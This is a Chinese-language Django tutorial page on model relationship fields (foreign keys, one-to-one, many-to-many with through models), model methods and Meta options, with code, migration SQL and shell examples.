关联关系用来表示模型与模型之间的关系
关系型数据库的强大之处在于各表之间的关联关系,Django支持所有常用的数据库关系:多对一、多对多和一对一
ForeignKey,ManyToManyField和OneToOneField接收的第一个参数为模型的类名,后面可以添加一个verbose_name参数
poll = models.ForeignKey(Poll, on_delete=models.CASCADE, verbose_name="the related poll") # 多对一,要将外键写在'多'的一方
sites = models.ManyToManyField(Site, verbose_name="list of sites") # 多对多
place = models.OneToOneField(Place, on_delete=models.CASCADE, verbose_name="related place") # 一对一

1、定义一个的多对一关联关系使用django.db.models.ForeignKey类
class ForeignKey(to, on_delete, **options)
外键需要两个位置参数,一个是关联的模型,另一个是on_delete选项
外键要定义在'多'的一方

如果要关联的对象在另外一个app中,可以显式的指出
manufacturer = models.ForeignKey('production.Manufacturer', on_delete=models.CASCADE)

如果要创建一个递归的外键,也就是自己关联自己的的外键,使用下面的方法:
models.ForeignKey('self', on_delete=models.CASCADE)

什么时候需要自己引用自己的外键呢？典型的例子就是评论系统,一条评论可以被很多人继续评论
class Comment(models.Model):
    title = models.CharField(max_length=128)
    text = models.TextField()
    parent_comment = models.ForeignKey('self', on_delete=models.CASCADE)
    # 外键字段定义的是父评论,而不是子评论。为什么呢？因为外键要放在'多'的一方！

在实际的数据库后台,Django会为每一个外键添加_id后缀,并以此创建数据表里的一列,例如question_id。但实际上在Django代码中不需要使用这个列名,除非书写原生的SQL语句,一般都直接使用字段名question

on_delete表示当一个被外键关联的对象被删除时,Django将模仿on_delete参数定义的SQL约束执行相应操作
比如有一个可为空的外键,并且想让它在关联的对象被删除时自动设为null,可以如下定义:
user = models.ForeignKey(User, models.SET_NULL, blank=True, null=True)

该参数可选的值都内置在django.db.models中,包括:
CASCADE:模拟SQL语言中的ON DELETE CASCADE约束,将定义有外键的模型对象同时删除
PROTECT:阻止上面的删除操作,但是弹出ProtectedError异常
SET_NULL:将外键字段设为null,只有当字段设置了null=True时方可使用该值。
SET_DEFAULT:将外键字段设为默认值,只有当字段设置了default参数时方可使用。
DO_NOTHING:什么也不做。
SET():设置为一个传递给SET()的值或一个回调函数的返回值,注意大小写

</pre><textarea>
from django.conf import settings
from django.contrib.auth import get_user_model
from django.db import models

def get_sentinel_user():
    return get_user_model().objects.get_or_create(username='deleted')[0]

class MyModel(models.Model):
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.SET(get_sentinel_user))

</textarea><textarea>
class Blog(models.Model):
    title = models.CharField(max_length=50)
    blog_type = models.ForeignKey(BlogType, on_delete=models.DO_NOTHING)
    content = models.TextField()
    author = models.ForeignKey(User, on_delete=models.DO_NOTHING)
    created_time = models.DateTimeField(auto_now_add=True)
    last_updated_time = models.DateTimeField(auto_now=True)

    def __str__(self):
        return "<  Blog: %s>" % self.title

</textarea><pre>
limit_choices_to
该参数用于限制外键所能关联的对象,只能用于Django的ModelForm(Django的表单模块)和admin后台,对其它场合无限制功能。其值可以是一个字典、Q对象或一个返回字典或Q对象的函数调用
staff_member = models.ForeignKey(User, on_delete=models.CASCADE, limit_choices_to={'is_staff': True})
这样定义则ModelForm的staff_member字段列表中,只会出现那些is_staff=True的Users对象,这一功能对于admin后台非常有用。

使用函数调用:
def limit_pub_date_choices(): return {'pub_date__lte': datetime.date.utcnow()}
limit_choices_to = limit_pub_date_choices

related_name
用于关联对象反向引用模型的名称
通常这个参数可不设置,Django会默认以模型的小写加上_set作为反向关联名,比如对于工厂就是car_set,如果觉得car_set还不够直观可以如下定义:
class Car(models.Model):manufacturer = models.ForeignKey('production.Manufacturer', on_delete=models.CASCADE, related_name='car_producted_by_this_manufacturer')
以后从工厂对象反向关联到它所生产的汽车就可以使用maufacturer.car_producted_by_this_manufacturer了。
如果不想为外键设置一个反向关联名称,可以将这个参数设置为"+"或以"+"结尾,如下所示:
user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='+')

related_query_name
反向关联查询名。用于从目标模型反向过滤模型对象的名称

</pre><textarea>
class Tag(models.Model):
    article = models.ForeignKey(Article, on_delete=models.CASCADE, related_name="tags", related_query_name="tag")
    name = models.CharField(max_length=255)

# 现在可以使用'tag'作为查询名了
Article.objects.filter(tag__name="important")

</textarea><pre>
to_field
默认外键都是关联到被关联对象的主键上,一般为id。如果指定这个参数可以关联到指定的字段上,但是该字段必须具有unique=True属性,也就是具有唯一属性。

db_constraint
默认这个参数被设为True表示遵循数据库约束,这也是大多数情况下的选择。如果设为False,那么将无法保证数据的完整性和合法性。在下面的场景中可能需要将它设置为False:
有历史遗留的不合法数据,没办法的选择
正在分割数据表

当它为False,并且试图访问一个不存在的关系对象时会抛出DoesNotExist异常。

swappable
控制迁移框架的动作,如果当前外键指向一个可交换的模型。使用场景非常稀少,通常请将该参数保持默认的True

2、使用OneToOneField来定义一对一关系
class OneToOneField(to, on_delete, parent_link=False, **options)

从概念上讲,一对一关系非常类似具有unique=True属性的外键关系,但是反向关联对象只有一个。这种关系类型多数用于当一个模型需要从别的模型扩展而来的情况。比如Django自带auth模块的User用户表,如果想在自己的项目里创建用户模型,又想方便的使用Django的认证功能,那么一个比较好的方案就是在的用户模型里使用一对一关系添加一个与auth模块User模型的关联字段。

如果没有给一对一关系设置related_name参数,Django将使用当前模型的小写名作为默认值

</pre><textarea>
from django.db import models
from django.conf import settings

# 两个字段都使用一对一关联到了Django内置的auth模块中的User模型
class MySpecialUser(models.Model):
    user = models.OneToOneField(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
    supervisor = models.OneToOneField(ttings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name='supervisor_of')

# 这样下来User模型将拥有下面的属性:
>>> user = User.objects.get(pk=1)
>>> hasattr(user, 'myspecialuser')  # True
>>> hasattr(user, 'supervisor_of')  # True

</textarea><pre>
3、使用django.db.models.ManyToManyField类定义一个多对多的关联关系,字段名建议设置为复数,表示所要关联的模型对象的集合
class ManyToManyField(to, **options)
比如一本书可以有好几个作者,一个作者也可以写好几本书
对于多对多光联关系的两个模型,可以在任何一个模型中添加ManyToManyField字段,但只能选择一个模型设置该字段,即不能同时在两模型中添加该字段。一般来讲应该把ManyToManyField实例放到需要在表单中被编辑的对象中

默认中间表
对于ManyToMany字段,Django采用的是第三张中间表的方式,通过这第三张表来关联ManyToMany的双方
在数据库后台Django实际上会额外创建一张用于体现多对多关系的中间表。默认中间表的名称是"多对多字段名+关联对象模型名+一个独一无二的哈希码",例如'author_books_9cdf4',当然也可以通过db_table选项自定义表名

</pre><textarea>
class Author(models.Model):
    name = models.CharField(max_length=50)
    email = models.EmailField()

class Book(models.Model):
    title = models.CharField(max_length=200)
    authors = models.ManyToManyField(Author)

$ python3 manage.py makemigrations
Migrations for 'polls':
  polls/migrations/0001_initial.py
    - Create model Author
    - Create model Book

$ python3 manage.py sqlmigrate polls 0001
BEGIN;
--
-- Create model Author
--
CREATE TABLE "polls_author" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(50) NOT NULL, "email" varchar(254) NOT NULL);
--
-- Create model Book
--
CREATE TABLE "polls_book" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "title" varchar(200) NOT NULL);
CREATE TABLE "polls_book_authors" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "book_id" integer NOT NULL REFERENCES "polls_book" ("id") DEFERRABLE INITIALLY DEFERRED, "author_id" integer NOT NULL REFERENCES "polls_author" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "polls_book_authors_book_id_author_id_73b6f03b_uniq" ON "polls_book_authors" ("book_id", "author_id");
CREATE INDEX "polls_book_authors_book_id_60f30711" ON "polls_book_authors" ("book_id");
CREATE INDEX "polls_book_authors_author_id_474a3602" ON "polls_book_authors" ("author_id");
COMMIT;

生成了三张表,一个是book表包含id,title两个字段,一个是author表包含id,name,email三个字段,这是在models.py文件中创建两个模型,但是有一点需要注意的是在book表里面没有创建的authors表,而是多了一个book_authors表,在这张表里面又多了两个字段book_id,author_id,其实这个第三张表就是用来存放书籍和作者之间映射关系的中间表

$ python3 manage.py migrate
$ python3 manage.py shell
>>> from polls.models import Author, Book
>>> Author.objects.create(name="Joe", email='joe@163.com')
>>> Author.objects.create(name="jean", email='jean@163.com')
>>> Book.objects.create(title="learn python")
>>> Book.objects.create(title="learn django")

>>> # 给多对多的字段添加值(添加多对多关系)
>>> a = Author.objects.get(id=1)
>>> b = Book.objects.get(id=1)
>>> b.authors.add(a)
>>>
>>> # 一本书的所有作者
>>> b = Book.objects.get(id=1)
>>> b.authors.all()
>>>
>>> # 一个作者的所有书籍:
>>> a = Author.objects.get(id=1)
>>> a.book_set.all()
>>>
>>> # 从多对多字段中删除值(删除多对多关系)
>>> b.authors.remove(a)

# 这个blog_book_authors是根据多对多关系自动生成的关系表,但是如果想要搜集关于这个作者发布某一本书籍的时间额外增加一个字段,或者说与现有的系统集成,这个关系表已经存在了,那对于这样的情形,Django允许指定一个用于管理多对多关系的中间模型,然后就可以把这些额外的字段添加到这个中间模型中,具体的方法就是在ManyToMany字段中指定through参数指定作为中介的中间模型,修改上述models.py

from django.utils import timezone
class Author(models.Model):
    name = models.CharField(max_length=50)
    email = models.EmailField()

class Book(models.Model):
    title = models.CharField(max_length=200)
    authors = models.ManyToManyField(Author, through='BookAuthor')

class BookAuthor(models.Model):
    author = models.ForeignKey(Author, on_delete=models.CASCADE)
    book = models.ForeignKey(Book, on_delete=models.CASCADE)
    puushed_at = models.DateTimeField(default=timezone.now)  # 添加额外的字段

    # 使用自定义的名称
    class Meta:
        db_table = 'book_author_relationship'

$ python3 manage.py makemigrations polls
Migrations for 'polls':
  polls/migrations/0001_initial.py
    - Create model Author
    - Create model Book
    - Create model BookAuthor
    - Add field authors to book

$ python3 manage.py sqlmigrate polls 0001
BEGIN;
--
-- Create model Author
--
CREATE TABLE "polls_author" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(50) NOT NULL, "email" varchar(254) NOT NULL);
--
-- Create model Book
--
CREATE TABLE "polls_book" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "title" varchar(200) NOT NULL);
--
-- Create model BookAuthor
--
CREATE TABLE "book_author_relationship" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "puushed_at" datetime NOT NULL, "author_id" integer NOT NULL REFERENCES "polls_author" ("id") DEFERRABLE INITIALLY DEFERRED, "book_id" integer NOT NULL REFERENCES "polls_book" ("id") DEFERRABLE INITIALLY DEFERRED);
--
-- Add field authors to book
--
CREATE TABLE "new__polls_book" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "title" varchar(200) NOT NULL);
INSERT INTO "new__polls_book" ("id", "title") SELECT "id", "title" FROM "polls_book";
DROP TABLE "polls_book";
ALTER TABLE "new__polls_book" RENAME TO "polls_book";
CREATE INDEX "book_author_relationship_author_id_4b112aa6" ON "book_author_relationship" ("author_id");
CREATE INDEX "book_author_relationship_book_id_abcc497f" ON "book_author_relationship" ("book_id");
COMMIT;

生成三张表:polls_author、polls_book、book_author_relationship
在创建中间模型的时候创建了两个外键,这两个外键定义了两个模型之间是如何关联到一起的
所以当创建多对多关系模型的时候提倡使用through参数去指定并创建中间模型,这样比较方便进行字段的扩展

使用多对多的中间模型之后add(),remove(),create()这些方法都会被禁用,所以在创建这种类型的关系时唯一的方法就是通过创建中间模型的实例

$ python3 manage.py migrate
$ python3 manage.py shell
>>> from django.utils import timezone
>>> from polls.models import Author, Book, BookAuthor
>>> ringo = Author.objects.create(name='Ringo',email='ringo@qq.com')
>>> paul = Author.objects.create(name='Paul',email='paul@qq.com')
>>> book1 = Book.objects.create(title='python book1')
>>> #  给多对多添加值也就是添加多对多关系
>>> m1 = BookAuthor(author=ringo,book=book1)
>>> m1.save()
>>> #  第二种添加方式
>>> m2 = BookAuthor.objects.create(author=paul,book=book1)
>>> BookAuthor.objects.all()
< QuerySet [< BookAuthor: BookAuthor object (1)>, < BookAuthor: BookAuthor object (2)>]>

</textarea><pre>
ManyToManyField多对多字段不支持Django内置的validators验证功能。
null参数对ManyToManyField多对多字段无效,设置null=True毫无意义

related_name
参考外键的相同参数。

related_query_name
参考外键的相同参数。

limit_choices_to
参考外键的相同参数。但是对于使用through参数自定义中间表的多对多字段无效。

symmetrical
默认情况下Django中的多对多关系是对称的
class Person(models.Model): friends = models.ManyToManyField("self")
Django认为,如果我是你的朋友,那么你也是我的朋友,这是一种对称关系,Django不会为Person模型添加person_set属性用于反向关联。如果不想使用这种对称关系,可以将symmetrical设置为False,这将强制Django为反向关联添加描述符。

db_table
设置中间表的名称。不指定的话则使用默认值。

db_constraint
参考外键的相同参数。

swappable
参考外键的相同参数。

through指定中间模型
如果想自定义多对多关系的那张额外的关联表可以使用这个参数,参数的值为一个中间模型。
一般情况普通的多对多已经够用,无需自己创建第三张关系表。但是某些情况可能更复杂一点,最常见的使用场景是需要为多对多关系添加额外的数据,比如两个人建立QQ好友的时间。

通常情况下,这张表在数据库内的结构是这个样子的:
中间表的id列....模型对象的id列.....被关联对象的id列

如果自定义中间表并添加时间字段,则在数据库内的表结构如下:
中间表的id列....模型对象的id列.....被关联对象的id列.....时间对象列

需要在设置中间模型的时候,显式地为多对多关系中涉及的中间模型指定外键。这种显式声明定义了这两个模型之间是如何关联的

</pre><textarea>
class Person(models.Model):
    name = models.CharField(max_length=128)
    def __str__(self): return self.name

class Group(models.Model):
    name = models.CharField(max_length=128)
    members = models.ManyToManyField(Person)
    def __str__(self): return self.name

$ python3 manage.py makemigrations
Migrations for 'polls':
  polls/migrations/0001_initial.py
    - Create model Person
    - Create model Group

$ python3 manage.py sqlmigrate polls 0001
BEGIN;
--
-- Create model Person
--
CREATE TABLE "polls_person" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(128) NOT NULL);
--
-- Create model Group
--
CREATE TABLE "polls_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(128) NOT NULL);
CREATE TABLE "polls_group_members" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "group_id" integer NOT NULL REFERENCES "polls_group" ("id") DEFERRABLE INITIALLY DEFERRED, "person_id" integer NOT NULL REFERENCES "polls_person" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "polls_group_members_group_id_person_id_ce176f60_uniq" ON "polls_group_members" ("group_id", "person_id");
CREATE INDEX "polls_group_members_group_id_f4695d83" ON "polls_group_members" ("group_id");
CREATE INDEX "polls_group_members_person_id_fb30aa04" ON "polls_group_members" ("person_id");
COMMIT;

class Person(models.Model):
    name = models.CharField(max_length=50)
    def __str__(self):
        return self.name

class Group(models.Model):
    name = models.CharField(max_length=128)
    members = models.ManyToManyField(Person, through='Membership')
    def __str__(self):
        return self.name

# 定义一个新的模型即是具体的中间表模型,除了两个外键字段用来保存Person和Group模型的多对多关系,并且同时增加了进组时间、'邀请人'和'邀请原因'的字段。
class Membership(models.Model):
    group = models.ForeignKey(Group, on_delete=models.CASCADE)
    person = models.ForeignKey(Person, on_delete=models.CASCADE)
    invite_reason = models.CharField(max_length=64)
    date_joined = models.DateField()

$ python3 manage.py makemigrations polls
Migrations for 'polls':
  polls/migrations/0001_initial.py
    - Create model Group
    - Create model Person
    - Create model Membership
    - Add field members to group

$ python3 manage.py sqlmigrate polls 0001
BEGIN;
--
-- Create model Group
--
CREATE TABLE "polls_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(128) NOT NULL);
--
-- Create model Person
--
CREATE TABLE "polls_person" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(50) NOT NULL);
--
-- Create model Membership
--
CREATE TABLE "polls_membership" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "invite_reason" varchar(64) NOT NULL, "date_joined" date NOT NULL, "group_id" integer NOT NULL REFERENCES "polls_group" ("id") DEFERRABLE INITIALLY DEFERRED, "person_id" integer NOT NULL REFERENCES "polls_person" ("id") DEFERRABLE INITIALLY DEFERRED);
--
-- Add field members to group
--
CREATE TABLE "new__polls_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(128) NOT NULL);
INSERT INTO "new__polls_group" ("id", "name") SELECT "id", "name" FROM "polls_group";
DROP TABLE "polls_group";
ALTER TABLE "new__polls_group" RENAME TO "polls_group";
CREATE INDEX "polls_membership_group_id_19f13d47" ON "polls_membership" ("group_id");
CREATE INDEX "polls_membership_person_id_fa058fab" ON "polls_membership" ("person_id");
COMMIT;

$ python3 manage.py migrate
$ python3 manage.py shell
>>> from datetime import date
>>> from polls.models import Group, Person, Membership
>>> ringo = Person.objects.create(name="Ringo Starr")
>>> paul = Person.objects.create(name="Paul McCartney")
>>> beatles = Group.objects.create(name="The Beatles")
>>>
>>> m1 = Membership(person=ringo, group=beatles, date_joined=date(1962, 8, 16), invite_reason="Needed a new drummer.")
>>> m1.save()
>>> beatles.members.all()
< QuerySet [< Person: Ringo Starr>]>
>>> ringo.group_set.all()
< QuerySet [< Group: The Beatles>]>
>>> m2 = Membership.objects.create(person=paul,group=beatles,date_joined=date(1960, 8, 1),invite_reason="Wanted to form a band.")
>>> beatles.members.all()
< QuerySet [< Person: Ringo Starr>, < Person: Paul McCartney>]>

>>> john = Person.objects.create(name="john john")
>>> jean = Person.objects.create(name="jean jean")
>>> jack = Person.objects.create(name="jack jack")

# 与普通的多对多不一样,使用自定义中间表的多对多不能直接使用add(),create(),remove()和set()方法来创建、删除关系
>>> beatles.members.add(john)                         # 无效
>>> beatles.members.create(name="George Harrison")    # 无效
>>> beatles.members.set([john, paul, ringo, george])  # 无效

# 也可以使用add(),create()或set()创建关系,只要为任何必需的字段指定through_defaults :
>>> beatles.members.add(john, through_defaults={'date_joined': date(1960, 8, 1)})
>>> beatles.members.all()
< QuerySet [< Person: Ringo Starr>, < Person: Paul McCartney>, < Person: john john>]>
>>> beatles.members.create(name="George Harrison", through_defaults={'date_joined': date(1960, 8, 1)})
>>> beatles.members.all()
< QuerySet [< Person: Ringo Starr>, < Person: Paul McCartney>, < Person: George Harrison>, < Person: john john>]>
>>> beatles.members.set([jean, jack], through_defaults={'date_joined': date(1960, 8, 1)})
>>> beatles.members.all()
< QuerySet [< Person: jean jean>, < Person: jack jack>]>
>>> Membership.objects.all()
< QuerySet [< Membership: Membership object (5)>, < Membership: Membership object (6)>]>

# 为什么？因为上面的方法无法提供加入时间、邀请原因等中间模型需要的字段内容。唯一的办法只能是通过创建中间模型的实例来创建这种类型的多对多关联。但是clear()方法是有效的,它能清空所有的多对多关系
>>> # 甲壳虫乐队解散了
>>> beatles.members.clear()
>>> # 删除了中间模型的对象
>>> Membership.objects.all()
< QuerySet []>

# remove方法被禁用也是出于同样的原因。 例如如果通过中介模型定义的表没有在源模型(Group)和目标模型(perseon)上强制执行唯一性,则remove()调用将不能提供足够的信息,说明应该删除哪个中介模型实例,此时会删除所有中间模型的实例
>>> beatles.members.all()
< QuerySet [< Person: jean jean>, < Person: jack jack>]>
>>> Membership.objects.create(person=jack, group=beatles, date_joined=date(1968, 9, 4), invite_reason="You've been gone for a month and we miss you.")
>>> beatles.members.all()
< QuerySet [< Person: jean jean>, < Person: jack jack>, < Person: jack jack>]>
>>> # This will not work because it cannot tell which membership to remove
>>> beatles.members.remove(jack)
>>> beatles.members.all()
< QuerySet [< Person: jean jean>]>

# 一旦通过创建中间模型实例的方法建立了多对多的关联,立刻就可以像普通的多对多那样进行查询操作,例如查找组内有Paul这个人的所有的组
>>> Group.objects.filter(members__name__startswith='jean')
< QuerySet [< Group: The Beatles>]>

# 可以使用中间模型的属性进行查询,例如查找甲壳虫乐队中加入日期在1961年1月1日之后的成员
>>> Person.objects.filter(group__name='The Beatles', membership__date_joined__gt=date(1959,1,1))
< QuerySet [< Person: jean jean>]>

# 可以像普通模型一样使用中间模型:
>>> jean_membership = Membership.objects.get(group=beatles, person=jean)
>>> jean_membership.date_joined    # datetime.date(1960, 8, 1)
>>> jean_membership.invite_reason  # ''

# 另一种访问同样信息的方法是通过Person对象来查询多对多递归关联关系
>>> jean_membership = jean.membership_set.get(group=beatles)
>>> jean_membership.date_joined    # datetime.date(1960, 8, 1)
>>> jean_membership.invite_reason  # ''

</textarea><pre>
through_fields
Membership模型中包含两个关联Person的外键,Django无法确定到底使用哪个作为和Group关联的对象。所以必须显式的指定through_fields参数,用于定义关系,就是through_fields参数指定从中间表模型Membership中选择哪两个字段,作为关系连接字段
through_fields参数接收一个二元元组('field1', 'field2'),field1是指向定义有多对多关系的模型的外键字段的名称,这里是Membership中的'group'字段,另外一个则是指向目标模型的外键字段的名称,这里是Membership中的'person',而不是'inviter'。

在中间模型当中有一些限制条件:
1、中间模型要么有且仅有一个指向源模型(例子当中的Group)的外键,要么必须通过ManyToManyField.through_fields参数在多个外键当中手动选择一个外键,如果有多个外健且没有用through_fields参数选择一个的话会出现验证错误。对于指向目标模型(例子当中的Person)的外键也有同样的限制。
2、在一个用于描述模型当中自己指向自己的多对多关系的中间模型当中,可以有两个指向同一个模型的外健,但这两个外健分表代表多对多关系(不同)的两端。如果外健的个数超过两个,必须和上面一样指定through_fields参数,要不然会出现验证错误。
3、在定义模型自己指向自己的多对多关系时,如果使用中间模型则必须定义symmetrical=False

</pre><textarea>
# 默认情况下中间模型只能包含一个指向源模型的外键关系,上面例子中也就是在Membership中只能有Person和Group外键关系各一个,否则必须显式的通过ManyToManyField.through_fields参数指定关联的对象
from django.db import models
class Person(models.Model):
    name = models.CharField(max_length=50)

class Group(models.Model):
    name = models.CharField(max_length=128)
    members = models.ManyToManyField(Person, through='Membership', through_fields=('group', 'person'))

class Membership(models.Model):
    group = models.ForeignKey(Group, on_delete=models.CASCADE)
    person = models.ForeignKey(Person, on_delete=models.CASCADE)
    inviter = models.ForeignKey(Person, on_delete=models.CASCADE, related_name="membership_invites" )
    invite_reason = models.CharField(max_length=64)

</textarea><pre>
【 模型方法 】
__str__()
A Python "magic method" that returns a string representation of any object. This is what Python and Django will use whenever a model instance needs to be coerced and displayed as a plain string. Most notably, this happens when you display an object in an interactive console or in the admin.
You'll always want to define this method; the default isn't very helpful at all.

</pre><textarea>
from django.db import models

class Person(models.Model):
    first_name = models.CharField(max_length=50)
    last_name = models.CharField(max_length=50)

    def __str__(self):
        return '%s %s' % (self.first_name, self.last_name)

</textarea><pre>
get_absolute_url()
This tells Django how to calculate the URL for an object. Django uses this in its admin interface, and any time it needs to figure out a URL for an object.
Any object that has a URL that uniquely identifies it should define this method.

</pre><textarea>
def get_absolute_url(self):
    return "/people/%i/" % self.id

def get_absolute_url(self):
    from django.urls import reverse
    return reverse('people.views.details', args=[str(self.id)])

# BAD template code. Avoid
< a href="/people/{{ object.id }}/">{{ object.name }}< /a>
# This template code is much better:
< a href="{{ object.get_absolute_url }}">{{ object.name }}< /a>

</textarea>自定义模型方法<textarea>
class Person(models.Model):
    first_name = models.CharField(max_length=50)
    last_name = models.CharField(max_length=50)
    birth_date = models.DateField()

    def baby_boomer_status(self):
        import datetime
        if self.birth_date < datetime.date(1945, 8, 1):
            return "Pre-boomer"
        elif self.birth_date < datetime.date(1965, 1, 1):
            return "Baby boomer"
        else:
            return "Post-boomer"

    @property
    def full_name(self):
        return '%s %s' % (self.first_name, self.last_name)

</textarea><pre>
【 重写内置方法 】
自定义的数据库行为,尤其是这两个最有可能定制的方法save()和delete(),比如在保存对象时额外做些事

from django.db import models
print([e for e in dir(models.Model) if not e.startswith('_')])
['check', 'clean', 'clean_fields', 'date_error_message', 'delete', 'from_db', 'full_clean', 'get_deferred_fields', 'pk', 'prepare_database_save', 'refresh_from_db', 'save', 'save_base', 'serializable_value', 'unique_error_message', 'validate_unique']

</pre><textarea>
from django.db import models

class Blog(models.Model):
    name = models.CharField(max_length=100)
    tagline = models.TextField()

    def save(self, *args, **kwargs):
        if self.name == "Yoko Ono's blog":
            return     # 阻止保存
        else:
            do_something()
            super().save(*args, **kwargs)  # Call the "real" save() method.
            do_something_else()

</textarea>

<h4>模型的元数据Meta</h4><pre>
模型的元数据指的是"除了字段外的所有内容",例如排序方式、数据库表名、人类可读的单数或者复数名等。所有的这些都是非必须的,甚至元数据本身对模型也是非必须的。但有些元数据选项能给予极大的帮助,在实际使用中具有重要的作用,是实际应用的'必须'。

每个模型都可以有自己的元数据类,每个元数据类也只对自己所在模型起作用

想在模型中增加元数据只要在模型类中添加一个子类,名字是固定的Meta,然后在这个Meta类下面增加各种元数据选项或者说设置项

</pre><textarea>
class Ox(models.Model):
    horn_length = models.IntegerField()

    class Meta:  # 是模型的子类,要缩进,为模型Ox增加了两个元数据'ordering'和'verbose_name_plural'分别表示排序和复数名
        ordering = ["horn_length"]
        verbose_name_plural = "oxen"

</textarea><pre>
abstract
abstract=True则模型会被认为是一个抽象模型。抽象模型本身不实际生成数据库表,而是作为其它模型的父类,被继承使用

app_label
如果定义了模型的app没有在INSTALLED_APPS中注册则必须通过此元选项声明它属于哪个app,例如app_label = 'myapp'

base_manager_name
自定义模型的_base_manager管理器的名字。模型管理器是Django为模型提供的API所在

db_table
指定在数据库中当前模型生成的数据表的表名,使用MySQL数据库时建议db_table用小写英文,比如:db_table = 'my_freinds'

db_tablespace
自定义数据库表空间的名字。默认值是工程的DEFAULT_TABLESPACE设置。

default_manager_name
自定义模型的_default_manager管理器的名字

default_related_name
默认从一个模型反向关联设置有关系字段的源模型使用< model_name >_set,这个元数据选项可以自定义反向关系名,同时也影响反向查询关系名

</pre><textarea>
class Foo(models.Model):
    pass

class Bar(models.Model):
    foo = models.ForeignKey(Foo)

    class Meta:
        default_related_name = 'bars'

具体的使用差别如下:
>>> bar = Bar.objects.get(pk=1)
>>> Foo.objects.get(bar=bar)  # 不能再使用"bar"作为反向查询的关键字
>>> Foo.objects.get(bars=bar) # 而要使用自己定义的"bars"

</textarea><pre>
get_latest_by
Django管理器提供有latest()和earliest()方法分别表示获取最近一个和最前一个数据对象。但如何来判断最近一个和最前面一个呢？也就是根据什么来排序呢？
get_latest_by元数据选项帮助解决这个问题,它可以指定一个类似DateField、DateTimeField或IntegerField这种可以排序的字段作为latest()和earliest()方法的排序依据,从而得出最近一个或最前面一个对象,例如:get_latest_by = "order_date"

managed
该元数据默认值为True,表示Django将按照既定的规则,管理数据库表的生命周期。
如果设置为False,将不会针对当前模型创建和删除数据库表。在某些场景下这可能有用,但更多时候可以忘记该选项。

order_with_respect_to
这个选项用途是根据指定的字段进行排序,通常用于关系字段

</pre><textarea>
class Question(models.Model):
    text = models.TextField()

class Answer(models.Model):
    question = models.ForeignKey(Question, on_delete=models.CASCADE)

    class Meta:
        order_with_respect_to = 'question'

上面在Answer模型中设置了order_with_respect_to = 'question',这样的话Django会自动提供两个API:get_RELATED_order()和set_RELATED_order(),其中的RELATED用小写的模型名代替。假设现在有一个Question对象关联着多个Answer对象,下面的操作返回包含关联的Anser对象的主键的列表[1,2,3]:

>>> question = Question.objects.get(id=1)
>>> question.get_answer_order()  # [1, 2, 3]

可以通过set_RELATED_order()方法,指定上面这个列表的顺序:
>>> question.set_answer_order([3, 1, 2])

同样的,关联的对象也获得了两个方法get_next_in_order()和get_previous_in_order(),用于通过特定的顺序访问对象
>>> answer = Answer.objects.get(id=2)
>>> answer.get_next_in_order()     # < Answer: 3>
>>> answer.get_previous_in_order() # < Answer: 1>

</textarea><pre>
ordering
最常用的元数据之一,用于指定该模型生成的所有对象的排序方式,接收一个字段名组成的元组或列表。默认按升序排列,如果在字段名前加上字符"-"则表示按降序排列,如果使用字符问号"？"表示随机排列

ordering = ['pub_date']             # 表示按'pub_date'字段进行升序排列
ordering = ['-pub_date']            # 表示按'pub_date'字段进行降序排列
ordering = ['-pub_date', 'author']  # 表示先按'pub_date'字段进行降序排列,再按`author`字段进行升序排列。

permissions
该元数据用于当创建对象时增加额外的权限。它接收一个所有元素都是二元元组的列表或元组,每个元素都是(权限代码, 直观的权限名称)的格式
permissions = (("can_deliver_pizzas", "可以送披萨"),)

default_permissions
Django默认给所有的模型设置('add', 'change', 'delete')的权限即增删改。可以自定义这个选项,比如设置为一个空列表表示不需要默认的权限,但是这一操作必须在执行migrate命令之前。

proxy
proxy=True表示使用代理模式的模型继承方式

required_db_features
声明模型依赖的数据库功能。比如['gis_enabled']表示模型的建立依赖GIS功能。

required_db_vendor
声明模型支持的数据库。Django默认支持sqlite, postgresql, mysql, oracle。

select_on_save
这个选项通常不用关心,决定是否使用1.6版本之前的django.db.models.Model.save()算法保存对象,默认False

indexes
接收一个应用在当前模型上的索引列表

</pre><textarea>
class Customer(models.Model):
    first_name = models.CharField(max_length=100)
    last_name = models.CharField(max_length=100)

    class Meta:
        indexes = [
            models.Index(fields=['last_name', 'first_name']),
            models.Index(fields=['first_name'], name='first_name_idx'),
        ]

</textarea><pre>
unique_together
这个元数据非常重要,等同于数据库的联合约束
假设有一张用户表,保存有用户的姓名、出生日期、性别和籍贯等信息,要求是所有的用户唯一不重复,可现在有好几个叫"张伟"的,如何区别它们呢？
可以设置不能有两个用户在同一个地方同一时刻出生并且都叫"张伟",使用这种联合约束,保证数据库能不能重复添加用户,在Django的模型中如何实现这种约束呢？使用unique_together,也就是联合唯一！
unique_together = (('name', 'birth_day', 'address'),)
一旦三者都相同则会被Django拒绝创建。这一元数据经常被用在admin后台,并且强制应用于数据库层面。

unique_together接收一个二维的元组((xx,xx,xx,...),(),(),()...),每一个元素都是一个元组,表示一组联合唯一约束,可以同时设置多组约束。为了方便,对于只有一组约束的情况下,可以简单地使用一维元素,例如:
unique_together = ('name', 'birth_day', 'address')
联合唯一无法作用于普通的多对多字段。

verbose_name
最常用的元数据之一,用于设置模型对象的直观、人类可读的名称,可以用中文
如果不指定它,那么Django会使用小写的模型名作为默认值。
